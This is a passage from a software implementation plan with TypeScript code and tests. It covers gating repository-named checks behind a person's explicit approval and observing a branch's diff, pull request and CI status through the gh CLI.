      this.#parts.port.log('a check was stopped because the desk closed; it left no evidence', {
        room: run.room,
        card: run.card,
        check: run.check.name,
      })
      return
    }
    const record: EvidenceRecord = {
      id: mintId(),
      fact: {
        kind: 'check',
        name: run.check.name,
        run: run.check.run,
        exit: result.exit,
        timedOut: result.timedOut,
        at: run.revision.head,
        dirty: run.revision.dirty,
        tail: result.tail,
      },
      card: { board: run.room, id: run.card },
      checkout: { cwd: run.cwd, branch: run.revision.branch },
      seat: run.seat,
      round: null,
      observedAt: this.#now(),
      posted: null,
    }
    await this.#parts.store.append(run.project, 'evidence', [{ type: 'evidence', record }]).catch((error: unknown) => {
      this.#parts.port.log("a check's result could not be recorded", {
        room: run.room,
        card: run.card,
        check: run.check.name,
        error: error instanceof Error ? error.message : String(error),
      })
    })
  }
}
```

- [ ] **Step 5: The plane holds the gate, and a quit stops what it started**

In `packages/server/src/evidence/plane.ts`:

1. Directly below `import { boardEvidence, RunningChecks } from './board.js'`, add `import { CheckRuns } from './check-runs.js'`.
2. After `readonly running = new RunningChecks()` and its comment, add:

```ts
  /** Runs a project's named checks, once a person has seen them (`check-runs.ts`). */
  readonly checks: CheckRuns
```

3. At the end of the constructor, after the `this.seen = new CommandsSeen(…)` statement, add:

```ts
    this.checks = new CheckRuns({
      store: this.store,
      seen: this.seen,
      seats: this.seats,
      running: this.running,
      port: {
        board: (room) => port.board(room),
        cwdOf: (runtime, sessionId) => port.cwdOf(runtime, sessionId),
        changed: (room) => this.announce(room),
        log: (message, details) => port.log(message, details),
      },
      ...(options.now ? { now: options.now } : {}),
    })
```

4. Replace `close()` and its comment with:

```ts
  /**
   * The desk is closing: every check still running is stopped — it leaves no
   * fact, since nothing was observed — and this resolves once every record
   * already asked for is on disk.
   */
  async close(): Promise<void> {
    await this.checks.stop()
    await this.seats.settled()
    // A write that failed was refused to its caller already; the quit says so again, where it is read.
    await this.store.flush().catch((error: unknown) =>
      this.#port.log('some evidence records could not be written before the desk closed', {
        error: error instanceof Error ? error.message : String(error),
      }),
    )
  }
```

`host.dispose()` already awaits `close()` (Task 4), so a quit stops every check before the audit log is flushed.

- [ ] **Step 6: The verb, on the wire**

1. In `packages/protocol/src/wire.ts`, after the `'evidence/board'` entry, add:

```ts
  /**
   * Runs one of the room's project's named checks for a card, and answers once
   * it has started: what it observed arrives as the room's evidence.
   *
   * Security-critical. A command a repository names runs only after a person
   * has approved it, verbatim, on this machine, for this repository and this
   * generation of its checks file as committed; until then — and again
   * whenever the file changes in any way — nothing runs, and the call is
   * refused `checkUnseen` with the command and the file's generation as data
   * (`CheckUnseen`). The person's answer is the same call with `seen` and
   * `digest` set to exactly what they were shown, which runs only while the
   * file is still exactly that. It runs with the person's own authority.
   */
  'evidence/check/run': {
    params: {
      readonly room: string
      readonly card: number
      readonly name: string
      /** The answer: the command exactly as it was shown… */
      readonly seen?: string
      /** …and the checks file it was shown from (`CheckUnseen.digest`). */
      readonly digest?: string
    }
    result: { readonly started: true }
  }
```

2. In `packages/protocol/src/wire-validators.ts`, after `'evidence/board': …,` add:

```ts
  'evidence/check/run': shape({
    room: isFilled,
    card: isNumber,
    name: isFilled,
    seen: optional(isString),
    digest: optional(isString),
  }),
```

3. In `packages/server/src/methods/evidence.ts`, after the `'evidence/board'` handler, add:

```ts

  /* Security-critical: every rule a check is held to is `CheckRuns.run`'s, and
     nothing here reads the file or runs anything of its own. */
  'evidence/check/run': (ctx, params) =>
    ctx.evidence.checks.run(params.room, params.card, params.name, { seen: params.seen, digest: params.digest }),
```

4. In `script/check-reachable.mjs`, add to `UNREACHED`:

```js
  'evidence/check/run': "a card offers Run <check>, in the second half of the evidence phase",
```

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-check-runs.test.js packages/server/dist/test/evidence-board.test.js`
Expected: PASS — 16 and 8 tests.

- [ ] **Step 8: Prove the tests can fail**

Run each, watch the named test go red, and restore:

1. **Never asked.** Delete the whole `if (!(await seen.approved(scope, check))) { … }` block: `nothing runs before a person has seen the command, and the refusal carries it verbatim` fails — the marker is there.
2. **Any answer runs.** Change `if (answer.seen !== check.run || answer.digest !== read.digest) {` to `if (answer.seen === undefined) {`: `an answer for text the file no longer holds runs nothing…` fails — the swapped command ran.
3. **The file's generation unchecked.** Change the same condition to `answer.seen !== check.run`: `an answer given for another generation of the file asks again, even when the command reads the same` fails.
4. **No confinement.** In `#checkoutFor`, delete the `if ((await projectOf(cwd)) !== project) { … }` block: `a card held in a checkout that is not part of the project runs nothing there` fails.
5. **A backup says where.** In `#lastCheckout`, drop `line.record.restored ||`: `a fact a backup brought never says where a check runs` fails — the check ran in the folder the backup named.
6. **The order.** Move the `// 2. Where it would run…` statement (`const cwd = await this.#checkoutFor(…)`) below the `// 3.` block, passing `cwd: folder` in the refusal's data: `a card held in a checkout that is not part of the project…` fails on `refused before anything was recorded as seen` — an answer was recorded for a check that then did not run.
7. **The lock keyed by name.** In `RunningChecks.start` (Task 10), key the run by `[room, card, name]`: `one check on a card at a time, whatever its name…` fails — `quick` starts beside `slow`.
8. **Admitted while closing.** Delete `if (this.#closing) return Promise.reject(new Error(CLOSING))` from `run`, or empty `still()`: `a quit that begins while a check is still being admitted stops it before it starts, and waits for it` fails — the late call is held rather than refused, or the caught call starts its command.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/check-runs.ts packages/protocol/src/evidence.ts packages/protocol/src/errors.ts packages/server/src/evidence/plane.ts packages/server/src/methods/evidence.ts packages/protocol/src/wire.ts packages/protocol/src/wire-validators.ts script/check-reachable.mjs packages/server/test/evidence-check-runs.test.ts
git commit -m "feat(evidence): a card's named check runs once a person has seen it

evidence/check/run reads the check from the project's checks.yml as
committed, runs it in the card's checkout only if that is part of the project
— never where only a backup says the card was — and only once a person on this
machine has approved the command for this repository and this generation of
the file; until then it is refused checkUnseen with the command and the
generation as data, and nothing runs. The answer runs only while the file is
still exactly what was shown. One check runs on a card at a time, whatever
its name. A call is admitted from its first line, so a quit refuses new ones
and stops one caught half-way before it starts anything, and waits for it.
The check answers once started; its fact arrives as the room's evidence, and
a quit stops it without one.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 12: Diff, pull request and CI, observed

The desk looks at a card's branch itself: its diff against the base it came from, its pull request, and the checks the forge ran on that pull request's head — read with the person's own `gh`, in the checkout, never taken from what an agent said it opened. It looks when a card is finished, while its holder's checkout is still known, and on a board read at most once every five minutes a card, so a pull request merged or a CI run finished since is seen. Only a fact that changed is recorded. A checkout outside the room's project is not looked at. A holder that finishes saying *all tests pass* leaves a diff and no check: the desk observed no check.

A fact a backup brought (Task 14) never steers this: the desk looks only where *it* last observed a card, and it compares a new look only with what *it* observed before — so the same facts restored from a backup are observed again here and recorded beside them, as this desk's own. The Seat a look credits is the holder's latest Seat this desk kept.

**Files:**
- Create: `packages/server/src/evidence/forge.ts`, `packages/server/src/evidence/observe.ts`
- Modify: `packages/server/src/evidence/plane.ts` (`EvidenceOptions.gh`, `observer`, `settled`, `#lookAround`; `board` looks around)
- Modify: `packages/server/src/team.ts` (`TeamPort.settled`, called where a card is finished)
- Modify: `packages/server/src/host.ts` (`HostOptions.evidence`, the plane's `gh`, the team port's `settled`)
- Test: `packages/server/test/evidence-observe.test.ts` (new)

**Proof needs:** neither — every test answers for the forge through `GhInCheckout`; nothing reaches a real forge.

**Interfaces:**
- Consumes: `isSha`, `factKey`, `mintId` (Task 2); `diffOf`, `projectOf`, `revisionOf` (Task 3); `EvidencePlane.announce` (Task 10).
- Produces: from `forge.ts`, `type GhInCheckout = (args: readonly string[], cwd: string) => Promise<{ stdout: string; stderr: string; exitCode: number }>`, `ghInCheckout`, `PR_FIELDS`, `type PullRequestRead = { kind: 'none' } | { kind: 'unreachable'; why: string } | { kind: 'found'; pr; ci: readonly CheckRun[] }`, `readPullRequest(cwd, gh?)`. From `observe.ts`: `OBSERVE_EVERY_MS = 300000`, `interface Look { room; card; project; cwd; seat }`, `class Observer { take(room, card): boolean; observe(look: Look): Promise<boolean> }`. `EvidenceOptions.gh?: GhInCheckout`; `EvidencePlane.observer: Observer`; `EvidencePlane.settled(room: string, intent: Intent): void`. `TeamPort.settled?(room: string, intent: Intent): void`. `HostOptions.evidence?: { readonly gh?: GhInCheckout }`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-observe.test.ts`:

```ts
import assert from 'node:assert/strict'
import { writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import { runtimeId, type BoardEvidence, type Session, type TeamState } from '@harnessdesk/protocol'

import { readPullRequest, type GhInCheckout } from '../src/evidence/forge.js'
import { Observer } from '../src/evidence/observe.js'
import { EvidencePlane } from '../src/evidence/plane.js'
import { canonical } from '../src/evidence/revision.js'
import { EvidenceStore } from '../src/evidence/store.js'
import { evidenceDesk, makeRepo, until, writeAgent, type Repo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * What the desk observes about a card's branch without being asked: its diff,
 * its pull request and the forge's checks on that pull request's head — read
 * by the desk itself, never taken from what an agent said it opened.
 */

/** A forge that answers every `gh pr view` with `answer`, and counts the asks. */
const forge = (answer: { stdout?: string; stderr?: string; exitCode?: number }) => {
  const asked: string[] = []
  const gh: GhInCheckout = async (args, cwd) => {
    asked.push(`${args.join(' ')} @ ${cwd}`)
    return { stdout: answer.stdout ?? '', stderr: answer.stderr ?? '', exitCode: answer.exitCode ?? 0 }
  }
  return { gh, asked }
}

/** A repository whose checked-out branch has work on it that `main` does not. */
const branchWithWork = async (): Promise<Repo> => {
  const repo = await makeRepo()
  await repo.git('checkout', '-q', '-b', 'work')
  await writeFile(join(repo.dir, 'work.txt'), 'one\ntwo\n')
  await repo.git('add', '.')
  await repo.git('commit', '-q', '-m', 'work')
  return repo
}

const HEAD = 'c'.repeat(40)

test("the forge's answer is read as a pull request and the checks it ran, each in a state a surface can draw", async () => {
  const { gh } = forge({
    stdout: JSON.stringify({
      number: 12,
      state: 'OPEN',
      headRefOid: HEAD.toUpperCase(),
      url: 'https://example.com/pr/12',
      statusCheckRollup: [
        { __typename: 'CheckRun', name: 'build', status: 'COMPLETED', conclusion: 'SUCCESS', detailsUrl: 'https://example.com/b' },
        { __typename: 'CheckRun', name: 'lint', status: 'COMPLETED', conclusion: 'FAILURE', detailsUrl: null },
        { __typename: 'CheckRun', name: 'e2e', status: 'IN_PROGRESS', conclusion: '' },
        { __typename: 'CheckRun', name: 'docs', status: 'COMPLETED', conclusion: 'SKIPPED' },
        { __typename: 'StatusContext', context: 'deploy/preview', state: 'PENDING', targetUrl: 'https://example.com/d' },
      ],
    }),
  })
  assert.deepEqual(await readPullRequest('/work/repo', gh), {
    kind: 'found',
    pr: { number: 12, head: HEAD, state: 'open', url: 'https://example.com/pr/12' },
    ci: [
      { name: 'build', url: 'https://example.com/b', state: 'passed' },
      { name: 'lint', url: null, state: 'failed' },
      { name: 'e2e', url: null, state: 'pending' },
      { name: 'docs', url: null, state: 'skipped' },
      { name: 'deploy/preview', url: 'https://example.com/d', state: 'pending' },
    ],
  })
})

test('a branch with no pull request has none, and a forge that cannot be asked says why', async () => {
  assert.deepEqual(
    await readPullRequest('/work/repo', forge({ exitCode: 1, stderr: 'no pull requests found for branch "work"' }).gh),
    { kind: 'none' },
  )
  assert.deepEqual(
    await readPullRequest('/work/repo', forge({ exitCode: 4, stderr: 'You are not logged into any hosts. Run gh auth login to authenticate.' }).gh),
    { kind: 'unreachable', why: 'You are not logged into any hosts. Run gh auth login to authenticate.' },
  )
})

test("a look records the branch's diff, pull request and checks once, and again only what changed", async () => {
  const repo = await branchWithWork()
  const project = await canonical(repo.dir)
  const store = new EvidenceStore(tempDir('hd-observe-store-'))
  const { gh } = forge({
    stdout: JSON.stringify({ number: 3, state: 'OPEN', headRefOid: HEAD, url: null, statusCheckRollup: [{ name: 'ci', status: 'COMPLETED', conclusion: 'SUCCESS' }] }),
  })
  const observer = new Observer({ store, gh, log: () => {} })
  const look = { room: 'room-1', card: 4, project, cwd: repo.dir, seat: 'seat-9' }
  const kinds = async (): Promise<string[]> =>
    (await store.read(project, 'evidence')).lines.flatMap((line) => (line.type === 'evidence' ? [line.record.fact.kind] : []))

  assert.equal(await observer.observe(look), true)
  assert.deepEqual(await kinds(), ['diff', 'pr', 'ci'])
  assert.equal(await observer.observe(look), false, 'nothing changed, so nothing new is kept')
  await writeFile(join(repo.dir, 'more.txt'), 'x\n')
  await repo.git('add', '.')
  await repo.git('commit', '-q', '-m', 'more')
  assert.equal(await observer.observe(look), true)
  assert.deepEqual(await kinds(), ['diff', 'pr', 'ci', 'diff'], 'only the diff moved')
  const [first] = (await store.read(project, 'evidence')).lines
  assert.ok(first?.type === 'evidence')
  assert.deepEqual(first.record.checkout, { cwd: repo.dir, branch: 'work' })
  assert.equal(first.record.seat, 'seat-9')
})

test('what a backup brought never stands for what this desk observed: the same facts, restored, are observed again here', async () => {
  const repo = await branchWithWork()
  const project = await canonical(repo.dir)
  const store = new EvidenceStore(tempDir('hd-observe-store-'))
  const { gh } = forge({ stdout: JSON.stringify({ number: 3, state: 'OPEN', headRefOid: HEAD, url: null, statusCheckRollup: [] }) })
  const look = { room: 'room-1', card: 4, project, cwd: repo.dir, seat: null }
  await new Observer({ store, gh, log: () => {} }).observe(look)
  // The same facts as a backup would bring them: marked, and so not this desk's.
  const brought = (await store.read(project, 'evidence')).lines.flatMap((line) =>
    line.type === 'evidence' ? [{ type: 'evidence' as const, record: { ...line.record, id: `${line.record.id}-restored`, restored: { at: 1 } } }] : [],
  )
  const fresh = new EvidenceStore(tempDir('hd-observe-store-'))
  await fresh.append(project, 'evidence', brought)
  assert.equal(await new Observer({ store: fresh, gh, log: () => {} }).observe(look), true)
  const lines = (await fresh.read(project, 'evidence')).lines.flatMap((line) => (line.type === 'evidence' ? [line.record] : []))
  assert.deepEqual(
    lines.map((record) => [record.fact.kind, Boolean(record.restored)]),
    [['diff', true], ['pr', true], ['diff', false], ['pr', false]],
  )
})

test('a fact a backup brought never says where the desk looks', async () => {
  const repo = await branchWithWork()
  const elsewhere = await branchWithWork()
  const project = await canonical(repo.dir)
  const state = tempDir('hd-observe-state-')
  const plane = new EvidencePlane(
    { dir: join(state, 'evidence'), seenFile: join(state, 'commands-seen.json') },
    {
      board: (room) =>
        room === 'room-1'
          ? ({ id: 'room-1', root: repo.dir, intents: [{ id: 1, state: 'done', claim: null }, { id: 2, state: 'done', claim: null }] } as unknown as TeamState)
          : null,
      cwdOf: () => null,
      push: () => {},
      log: () => {},
    },
  )
  const at = await repo.git('rev-parse', 'HEAD')
  const fact = (id: string, card: number, cwd: string, restored: boolean) => ({
    type: 'evidence' as const,
    record: {
      id,
      fact: { kind: 'diff' as const, files: 1, added: 2, removed: 0, from: at, to: at },
      card: { board: 'room-1', id: card },
      checkout: { cwd, branch: 'work' },
      observedAt: 1,
      ...(restored ? { restored: { at: 1 } } : {}),
    },
  })
  // Card 1 is known only from a backup, which says it was observed somewhere else; card 2 this desk observed here.
  await plane.store.append(project, 'evidence', [fact('brought', 1, elsewhere.dir, true), fact('kept', 2, repo.dir, false)])
  await plane.board('room-1')
  assert.equal(plane.observer.take('room-1', 1), true, 'nobody went to look where the backup said')
  assert.equal(plane.observer.take('room-1', 2), false, 'where this desk observed it, it looks again')
  await plane.close()
})

test("a checkout outside the room's project is not looked at", async () => {
  const repo = await branchWithWork()
  const store = new EvidenceStore(tempDir('hd-observe-store-'))
  const { gh, asked } = forge({ exitCode: 1, stderr: 'no pull requests found' })
  const observer = new Observer({ store, gh, log: () => {} })
  assert.equal(await observer.observe({ room: 'room-1', card: 1, project: '/somewhere/else', cwd: repo.dir, seat: null }), false)
  assert.deepEqual(asked, [])
})

test('through the host: a card its holder finishes leaves the diff it was finished at, by its Seat', async (t) => {
  const repo = await branchWithWork()
  const { gh } = forge({ exitCode: 1, stderr: 'no pull requests found for branch "work"' })
  const { host, stateDir } = await evidenceDesk(t, { evidence: { gh } }, { stateDir: tempDir('hd-observe-state-'), repo })
  await writeAgent(stateDir)
  const session = (await host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Work' })) as TeamState
  await host.call('team/room/join', { room: room.id, runtime: runtimeId('fake'), sessionId: String(session.id) })
  await host.call('team/add', { room: room.id, title: 'Do the work' })
  const scope = { runtime: 'fake', sessionId: String(session.id) }
  assert.match(await host.teamPlane.claim(1, scope), /^Claimed #1 — Do the work\./)
  await host.teamPlane.complete(1, { note: 'done — all tests pass' }, scope)

  const board = await until(async () => {
    const read = (await host.call('evidence/board', { room: room.id })) as BoardEvidence
    return read.cards.some((card) => card.facts.some((fact) => fact.record.fact.kind === 'diff')) ? read : null
  }, 'the diff the finished card left')
  const diff = board.cards[0]?.facts.find((fact) => fact.record.fact.kind === 'diff')
  assert.deepEqual(diff?.record.checkout, { cwd: repo.dir, branch: 'work' })
  assert.deepEqual(diff?.by, { agent: 'Scout', seat: session.settings?.seatLabel ?? '' })
  assert.equal(
    board.cards[0]?.facts.some((fact) => fact.record.fact.kind === 'check'),
    false,
    'the holder said the tests pass; the desk observed no check, so there is none',
  )
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/forge.js'`.

- [ ] **Step 3: The forge, read with `gh`**

Create `packages/server/src/evidence/forge.ts`:

```ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'

import type { CheckRun, Sha } from '@harnessdesk/protocol'

import { isSha } from './records.js'

/**
 * What the forge says about a checkout's branch: its pull request, and the
 * checks the forge ran on that pull request's head. Read with the person's own
 * `gh`, the way the forge plane reaches it (`../forge.ts`) — through
 * `execFile`, never a shell — in the checkout, so `gh` finds the branch's
 * pull request itself.
 *
 * Observed, never reported: this is the desk reading the forge, not an agent
 * saying what it opened.
 */

/** `gh`, run in a checkout. Overridable so a test answers as the forge would. */
export type GhInCheckout = (
  args: readonly string[],
  cwd: string,
) => Promise<{ readonly stdout: string; readonly stderr: string; readonly exitCode: number }>

const run = promisify(execFile)

export const ghInCheckout: GhInCheckout = async (args, cwd) => {
  try {
    const result = await run('gh', [...args], { cwd, timeout: 15_000, maxBuffer: 4 * 1024 * 1024 })
    return { stdout: result.stdout.toString(), stderr: result.stderr.toString(), exitCode: 0 }
  } catch (error) {
    const failure = error as { stdout?: string; stderr?: string; code?: number | string; message?: string }
    return {
      stdout: failure.stdout?.toString() ?? '',
      stderr: failure.stderr?.toString() ?? failure.message ?? '',
      exitCode: typeof failure.code === 'number' ? failure.code : 1,
    }
  }
}

/** The fields asked for, and nothing more. */
export const PR_FIELDS = 'number,state,headRefOid,url,statusCheckRollup'

export type PullRequestRead =
  | { readonly kind: 'none' }
  | { readonly kind: 'unreachable'; readonly why: string }
  | {
      readonly kind: 'found'
      readonly pr: { readonly number: number; readonly head: Sha; readonly state: 'open' | 'merged' | 'closed'; readonly url: string | null }
      readonly ci: readonly CheckRun[]
    }

const STATES: Readonly<Record<string, 'open' | 'merged' | 'closed'>> = { OPEN: 'open', MERGED: 'merged', CLOSED: 'closed' }

/** One entry of the forge's roll-up, as a check run with a state a surface can draw. */
const checkRunOf = (value: unknown): CheckRun | null => {
  const entry = value as {
    __typename?: unknown
    name?: unknown
    context?: unknown
    status?: unknown
    conclusion?: unknown
    state?: unknown
    detailsUrl?: unknown
    targetUrl?: unknown
  } | null
  if (typeof entry !== 'object' || entry === null) return null
  const name = typeof entry.name === 'string' ? entry.name : typeof entry.context === 'string' ? entry.context : null
  if (name === null) return null
  const url = typeof entry.detailsUrl === 'string' ? entry.detailsUrl : typeof entry.targetUrl === 'string' ? entry.targetUrl : null
  const word = (value: unknown): string => (typeof value === 'string' ? value.toUpperCase() : '')
  if (entry.__typename === 'StatusContext' || entry.context !== undefined) {
    const state = word(entry.state)
    return {
      name,
      url,
      state: state === 'SUCCESS' ? 'passed' : state === 'FAILURE' || state === 'ERROR' ? 'failed' : 'pending',
    }
  }
  if (word(entry.status) !== 'COMPLETED') return { name, url, state: 'pending' }
  const conclusion = word(entry.conclusion)
  return {
    name,
    url,
    state:
      conclusion === 'SUCCESS'
        ? 'passed'
        : conclusion === 'CANCELLED'
          ? 'cancelled'
          : ['SKIPPED', 'NEUTRAL', 'STALE'].includes(conclusion)
            ? 'skipped'
            : 'failed',
  }
}

/** The checkout's branch's pull request and its checks, or why there is none to read. */
export const readPullRequest = async (cwd: string, gh: GhInCheckout = ghInCheckout): Promise<PullRequestRead> => {
  const answer = await gh(['pr', 'view', '--json', PR_FIELDS], cwd)
  if (answer.exitCode !== 0) {
    const said = `${answer.stderr} ${answer.stdout}`.trim()
    if (/no pull requests? found/i.test(said)) return { kind: 'none' }
    return { kind: 'unreachable', why: said.split('\n')[0] || 'gh could not answer.' }
  }
  let parsed: { number?: unknown; state?: unknown; headRefOid?: unknown; url?: unknown; statusCheckRollup?: unknown }
  try {
    parsed = JSON.parse(answer.stdout) as typeof parsed
  } catch {
    return { kind: 'unreachable', why: 'gh answered with something that is not JSON.' }
  }
  const state = typeof parsed.state === 'string' ? STATES[parsed.state.toUpperCase()] : undefined
  const head = typeof parsed.headRefOid === 'string' ? parsed.headRefOid.toLowerCase() : ''
  if (!Number.isInteger(parsed.number) || state === undefined || !isSha(head)) {
    return { kind: 'unreachable', why: 'gh answered without a pull request number, state or head.' }
  }
  const ci = (Array.isArray(parsed.statusCheckRollup) ? parsed.statusCheckRollup : []).flatMap((one) => {
    const check = checkRunOf(one)
    return check ? [check] : []
  })
  return {
    kind: 'found',
    pr: { number: parsed.number as number, head, state, url: typeof parsed.url === 'string' ? parsed.url : null },
    ci,
  }
}
```

- [ ] **Step 4: The observer**

Create `packages/server/src/evidence/observe.ts`:

```ts
import type { Evidence, EvidenceRecord } from '@harnessdesk/protocol'

import { readPullRequest, type GhInCheckout } from './forge.js'
import { factKey, mintId } from './records.js'
import { diffOf, projectOf, revisionOf } from './revision.js'
import type { EvidenceStore } from './store.js'

/**
 * The facts the desk observes about a card's branch without being asked: its
 * diff against the base it came from, its pull request, and the checks the
 * forge ran on that pull request's head.
 *
 * Looked at when a card is finished, while its holder's checkout is still
 * known, and when a board is opened, at most once every few minutes a card, so
 * a pull request merged or a CI run finished since is seen. A fact is recorded
 * only when it differs from the card's latest of its kind: the store keeps
 * what changed, not every look.
 */

/** How long a card's branch is left before a board opened again looks at it again. */
export const OBSERVE_EVERY_MS = 5 * 60 * 1000

export interface Look {
  readonly room: string
  readonly card: number
  /** The room's project: a checkout outside it is not looked at. */
  readonly project: string
  readonly cwd: string
  /** The Seat holding the card when it was looked at; null when nobody was. */
  readonly seat: string | null
}

export class Observer {
  readonly #store: EvidenceStore
  readonly #gh: GhInCheckout | undefined
  readonly #now: () => number
  readonly #log: (message: string, details?: Readonly<Record<string, unknown>>) => void
  readonly #looked = new Map<string, number>()

  constructor(parts: {
    readonly store: EvidenceStore
    readonly gh?: GhInCheckout
    readonly now?: () => number
    readonly log: (message: string, details?: Readonly<Record<string, unknown>>) => void
  }) {
    this.#store = parts.store
    this.#gh = parts.gh
    this.#now = parts.now ?? Date.now
    this.#log = parts.log
  }

  /**
   * Whether a card is due another look — never looked at, or not for a while —
   * and if it is, marks it looked at now, so a second board read before the
   * look happens does not queue it again.
   */
  take(room: string, card: number): boolean {
    const key = JSON.stringify([room, card])
    const at = this.#looked.get(key)
    if (at !== undefined && this.#now() - at < OBSERVE_EVERY_MS) return false
    this.#looked.set(key, this.#now())
    return true
  }

  /** Looks at one card's branch now and records each fact that is new. Answers whether anything was. */
  async observe(look: Look): Promise<boolean> {
    this.#looked.set(JSON.stringify([look.room, look.card]), this.#now())
    if ((await projectOf(look.cwd)) !== look.project) {
      this.#log('a card was not looked at: its checkout is not part of its room’s project', {
        room: look.room,
        card: look.card,
        cwd: look.cwd,
      })
      return false
    }
    const revision = await revisionOf(look.cwd)
    if (!revision) return false

    const facts: Evidence[] = []
    const diff = await diffOf(look.cwd)
    if (diff) facts.push({ kind: 'diff', ...diff })
    const forge = await readPullRequest(look.cwd, this.#gh)
    if (forge.kind === 'unreachable') {
      this.#log('the forge could not be read for a card', { room: look.room, card: look.card, why: forge.why })
    } else if (forge.kind === 'found') {
      facts.push({ kind: 'pr', ...forge.pr })
      if (forge.ci.length > 0) facts.push({ kind: 'ci', checks: forge.ci, at: forge.pr.head })
    }

    // What this desk has observed before. A fact a backup brought is not: the desk's own look is recorded beside it.
    const known = new Map<string, EvidenceRecord>()
    for (const line of (await this.#store.read(look.project, 'evidence')).lines) {
      if (line.type !== 'evidence' || line.record.card?.board !== look.room || line.record.card.id !== look.card) continue
      if (line.record.restored) continue
      known.set(factKey(line.record.fact), line.record)
    }
    const changed = facts.filter((fact) => JSON.stringify(known.get(factKey(fact))?.fact) !== JSON.stringify(fact))
    if (changed.length === 0) return false
    const observedAt = this.#now()
    await this.#store.append(
      look.project,
      'evidence',
      changed.map((fact) => ({
        type: 'evidence' as const,
        record: {
          id: mintId(),
          fact,
          card: { board: look.room, id: look.card },
          checkout: { cwd: look.cwd, branch: revision.branch },
          seat: look.seat,
          round: null,
          observedAt,
          posted: null,
        },
      })),
    )
    return true
  }
}
```

- [ ] **Step 5: The plane looks when a card is finished, and when a board is read**

In `packages/server/src/evidence/plane.ts`:

1. Add `EvidenceRecord,` and `Intent,` to the type import from `@harnessdesk/protocol`, and directly below `import { readChecks } from './checks-file.js'` add:

```ts
import type { GhInCheckout } from './forge.js'
import { Observer, type Look } from './observe.js'
```

2. In `interface EvidenceOptions`, after `seenFile` and its comment, add:

```ts
  /** How a branch's pull request is read; the person's own `gh` when absent. */
  readonly gh?: GhInCheckout
```

3. After `readonly checks: CheckRuns` and its comment, add:

```ts
  /** Looks at a card's branch: its diff, its pull request and the forge's checks (`observe.ts`). */
  readonly observer: Observer
```

4. At the end of the constructor, after the `this.checks = new CheckRuns({ … })` statement, add:

```ts
    this.observer = new Observer({
      store: this.store,
      ...(options.gh ? { gh: options.gh } : {}),
      ...(options.now ? { now: options.now } : {}),
      log: (message, details) => port.log(message, details),
    })
```

5. In `board()`, directly after `const records = lines.flatMap(…)`, add:

```ts
    this.#lookAround(room, board, project, records)
```

6. Add above `close()`:

```ts
  /**
   * A card was finished. While its holder is still on it, the desk looks at
   * the branch it was finished on, and tells every window when that recorded
   * something. Never awaited by the board.
   */
  settled(room: string, intent: Intent): void {
    if (intent.state !== 'done' || !intent.claim) return
    const cwd = this.#port.cwdOf(intent.claim.runtime, intent.claim.sessionId)
    const board = this.#port.board(room)
    if (!cwd || !board) return
    const seat = this.seats.latestKeptOf(intent.claim.runtime, intent.claim.sessionId)?.id ?? null
    void (async () => {
      const look: Look = { room, card: intent.id, project: await projectOf(board.cwd ?? board.root), cwd, seat }
      if (await this.observer.observe(look)) this.announce(room)
    })().catch((error: unknown) =>
      this.#port.log('a finished card could not be looked at', {
        room,
        card: intent.id,
        error: error instanceof Error ? error.message : String(error),
      }),
    )
  }

  /**
   * On a board read, the cards due another look — each at most once every few
   * minutes — are looked at in the background, one at a time: a claimed card in
   * its holder's checkout, a settled one where its latest fact was observed.
   * A card with neither is not looked at, since there is nowhere to look.
   */
  #lookAround(room: string, board: TeamState, project: string, records: readonly EvidenceRecord[]): void {
    const looks: Look[] = []
    for (const intent of board.intents) {
      const holder =
        intent.state === 'claimed' && intent.claim ? this.#port.cwdOf(intent.claim.runtime, intent.claim.sessionId) : null
      // Where this desk last observed it: a fact a backup brought never says where to look.
      const last = [...records]
        .reverse()
        .find((one) => !one.restored && one.card?.board === room && one.card.id === intent.id && one.checkout)
      const cwd = holder ?? last?.checkout?.cwd ?? null
      if (!cwd || !this.observer.take(room, intent.id)) continue
      const seat = holder && intent.claim ? (this.seats.latestKeptOf(intent.claim.runtime, intent.claim.sessionId)?.id ?? null) : null
      looks.push({ room, card: intent.id, project, cwd, seat })
    }
    if (looks.length === 0) return
    void (async () => {
      let recorded = false
      for (const look of looks) {
        try {
          recorded = (await this.observer.observe(look)) || recorded
        } catch (error) {
          this.#port.log('a card could not be looked at', {
            room,
            card: look.card,
            error: error instanceof Error ? error.message : String(error),
          })
        }
      }
      if (recorded) this.announce(room)
    })()
  }
```

- [ ] **Step 6: The board says when a card is finished**

In `packages/server/src/team.ts`:

1. In `interface TeamPort`, after `log?(message: string, details?: Readonly<Record<string, unknown>>): void`, add:

```ts
  /**
   * A card was finished, by its holder or by the person — told with the card
   * as it stood a moment before, so its holder is still on it. The evidence
   * plane looks at the branch it was finished on. Called after the board is
   * written, never awaited: a finish is never held up by what it observes.
   */
  settled?(room: string, intent: Intent): void
```

2. In `intentAction`, in the `action === 'done'` branch, between the `this.#flows?.completed(board.id, { … })` call and its `return`, add:

```ts
      this.#port.settled?.(board.id, { ...intent, state: 'done', outcome: said })
```

3. In `complete()`, directly after `this.#flows?.completed(board.id, { ...intent, state: 'done', outcome })`, add:

```ts
    this.#port.settled?.(board.id, { ...intent, state: 'done', outcome })
```

Both pass the card as it stood before it was patched, so `intent.claim` still names its holder.

- [ ] **Step 7: The host wires both ends**

In `packages/server/src/host.ts`:

1. Add `import type { GhInCheckout } from './evidence/forge.js'` after `import { EvidencePlane } from './evidence/plane.js'`.
2. In `interface HostOptions`, after `readonly forge?: ForgePlaneOptions` and its comment, add:

```ts
  /** How the evidence plane reads a branch's pull request with `gh`. Tests answer as the forge would. */
  readonly evidence?: { readonly gh?: GhInCheckout }
```

